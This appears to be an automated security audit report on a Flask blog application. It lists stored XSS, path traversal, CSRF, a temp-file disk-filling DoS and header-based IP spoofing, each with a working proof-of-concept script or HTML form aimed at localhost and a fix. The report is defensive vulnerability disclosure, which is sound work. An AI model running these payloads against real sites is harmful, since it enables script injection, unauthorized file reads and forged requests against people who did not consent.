====

Auto Security Analysis of blog-eletrix-fr at 2026-02-27

CRITICAL - Stored Cross-Site Scripting (XSS)
The application allows users to create blog posts with arbitrary Markdown content. When rendering these posts, it uses the `markdown2` library and applies the `|safe` Jinja2 filter in `post.html`. Since the content is not sanitized before being rendered as "safe" HTML, an attacker with administrative access (or via CSRF) can inject malicious JavaScript into a blog post, which will execute in the browser of any user who views the post.

PoC
```python
import requests

session = requests.Session()
# Login as admin
session.post("http://127.0.0.1:5000/login", data={"username": "admin", "password": "admin"})

# Create a malicious post
payload = {
    "title": "XSS_Vulnerability",
    "author": "attacker",
    "tags": "test",
    "content": "<script>alert('XSS_SUCCESS')</script>"
}
session.post("http://127.0.0.1:5000/create_post", data=payload)

# Access the post
response = session.get("http://127.0.0.1:5000/post/XSS_Vulnerability")
if "alert('XSS_SUCCESS')" in response.text:
    print("XSS PoC successful!")
```

Fix
Use a sanitization library like `bleach` to clean the HTML generated from Markdown before passing it to the template, or avoid using the `|safe` filter and instead use a Markdown renderer that supports safe mode or escaping.

====

MEDIUM - Path Traversal
The `/post/<name>` route uses `os.path.join` to construct a file path from user-supplied input without sufficient validation. Specifically, it joins `utils.POSTS_DIR` with `f"{name}.md"`. An attacker can use directory traversal sequences (e.g., `..%2f`) to attempt to read files outside the intended directory. While the application appends `.md` to the filename, it can still be used to access other files if they have that extension or by targeting files that happen to match the constructed path.

PoC
```python
import requests

# The vulnerability is in routes/post.py:
# filepath = os.path.join(utils.POSTS_DIR, f"{name}.md")
# If name is "../README", it reads "articles/../README.md" which is "README.md"

url = "http://127.0.0.1:5000/post/..%2fREADME"
response = requests.get(url)

if response.status_code == 200:
    print("Path Traversal successful!")
    print(response.text[:200])
```

Fix
Use `werkzeug.utils.secure_filename` to sanitize the `name` parameter or verify that the resulting absolute path starts with the intended directory.

====

MEDIUM - Cross-Site Request Forgery (CSRF)
The application lacks CSRF protection on critical state-changing routes, including `/login`, `/create_post`, and `/upload`. An attacker can trick a logged-in administrator into visiting a malicious website that submits requests to these endpoints on their behalf, potentially leading to unauthorized post creation or file uploads.

PoC
```html
<html>
  <body>
    <h1>CSRF PoC</h1>
    <form action="http://127.0.0.1:5000/create_post" method="POST" id="csrf-form">
      <input type="hidden" name="title" value="CSRF_Post" />
      <input type="hidden" name="author" value="attacker" />
      <input type="hidden" name="tags" value="csrf" />
      <input type="hidden" name="content" value="This post was created via CSRF" />
    </form>
    <script>
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

Fix
Implement CSRF protection using an extension like `Flask-WTF` or by manually validating CSRF tokens on all POST/PUT/DELETE requests.

====

LOW - Denial of Service (DoS) via Temporary File Leakage
The `/upload` route saves uploaded files to a temporary directory `./temp_uploads/` before processing them. If the file processing (adding a watermark) fails (e.g., if a non-image file is uploaded), an exception is raised, and the code to delete the temporary file is never reached. This allows an attacker to fill the server's disk space by repeatedly uploading invalid files.

PoC
```python
import requests
import io

session = requests.Session()
session.post("http://127.0.0.1:5000/login", data={"username": "admin", "password": "admin"})

# Upload many non-image files
for i in range(10):
    files = {'file': (f'dos_{i}.txt', io.BytesIO(b"not an image" * 1000), 'text/plain')}
    session.post("http://127.0.0.1:5000/upload/", files=files)

# Check temp_uploads directory (requires server-side access to verify in PoC)
```

Fix
Use a `try...finally` block to ensure that temporary files are deleted regardless of whether processing succeeds or fails.

====

LOW - IP Spoofing
The application trusts the `CF-Real-IP` header provided in the request to determine the user's IP address. If the application is not behind a Cloudflare proxy that is configured to overwrite or strip this header from untrusted sources, an attacker can spoof their IP address by providing a custom `CF-Real-IP` header.

PoC
```python
import requests

url = "http://127.0.0.1:5000/"
headers = {"CF-Real-IP": "13.37.13.37"}
response = requests.get(url, headers=headers)
# The application uses this IP in the context processor, which could be logged or used in logic.
```

Fix
Only trust headers like `CF-Real-IP` or `X-Forwarded-For` if the request originates from a trusted proxy.

====

Summary
| Severity | Exploit Name |
|----------|--------------|
| CRITICAL | Stored Cross-Site Scripting (XSS) |
| MEDIUM   | Path Traversal |
| MEDIUM   | Cross-Site Request Forgery (CSRF) |
| LOW      | Denial of Service (DoS) via Temporary File Leakage |
| LOW      | IP Spoofing |
